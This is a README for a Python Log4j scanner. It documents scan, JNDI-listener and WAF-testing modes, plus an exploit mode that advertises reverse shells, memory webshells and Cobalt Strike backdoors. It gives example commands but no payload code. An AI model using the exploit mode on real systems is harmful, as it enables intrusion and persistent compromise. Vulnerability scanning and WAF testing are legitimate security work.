# Log4j-Scaner

:blush: A Log4j vulnerability scanner document to record the process of development.


## Usage
```
Usage:
    python run.py -m scan -t http://127.0.0.1 -p http://127.0.0.1:8080
    python run.py -m scan -f targets.txt -j 1 -L 127.0.0.1:1389
    python run.py -m scan -t http://127.0.0.1 -w 
    python run.py -m jndi -l 127.0.0.1:1389 -k keyword
    python run.py -m exploit -e revershell -l 127.0.0.1:5555 -t http://target.domian -s header -d "Cookie: 123"
    python run.py -h

mode:
    -m scan, --mode scan
        scan vulnerability with Log4j
    -m jndi, --mode jndi
        start a jndi listener which can match the keyword from the client request
    -m exploit, --mode exploit
        exploit the target

Exploit Options:
    -h
        Show helper
    -t <target.domain/target.ip>
        Single target
    -f <filename>
        Target file 
    -s <site>
        The site of vulnerability in the http packet
    -e <reverse/webshell/cs>
        Exploit type:
          reverse: reverse shell
          webshell: memory webshell
          cs: cobalt strike backdoor
    -d <filename/IP:PORT>
        The input of exploit:
          <filename>: webshell file or cobalt strike backdoor
          <IP:PORT>: listener of reverse shell
Exploit Options:
    -h
        Show helper
    -l port
        Listener port
    -j <num>
        Payload id
    -l
        Show payload list
Scan Options:
    -t <target>, --target <target>
        target to scan.
    -f <file path>, --file <file path>
        targets file path.
    -j <num>, --jndipayload <num>
        Used payload, can be list by option -l.
    -L <ip:port>, --local <ip:port>
        Run local jndi server to record the request, but the public IP is essential.
    -p <protocol://ip:port>, --proxy <protocol://ip:port>
        Use proxy
    -h, --help
        Show help
    -w, --waf
        Verify the effectiveness of WAF rules about Log4j. This mode only support options with -t, -p.
    -l, --list
        List all payload can use.
Jndi Options:
    -h, --hlep
        show JNDI Server options
    -l <port>, local <port>
        Used local port to start the JNDI
    -k <keyword>, --key <keyword>
        The keyword will be match in the flow of JNDI.
```

## Function
### Directory
`run.py` main code.
`log` The folder to record the message of running.
`module` The folder of scanner module.
`result` The folder of scanner result
```
Log4jScanner
|   run.py
|
+---log
|       day2021_12_17.txt
|       day2021_12_21.txt
|       day2021_12_23.txt
|
+---modules
|   |   exploit.py
|   |   JndiServer.py
|   |   log.py
|   |   proxy.py
|   |   scan.py
|   |   __init__.py
|   |
|   \---__pycache__
|           exploit.cpython-39.pyc
|           JndiServer.cpython-39.pyc
|           log.cpython-39.pyc
|           scan.cpython-39.pyc
|           __init__.cpython-39.pyc
|
\---result
        dnslog-result-20211217-1503.txt
        dnslog-result-20211217-1518.txt
```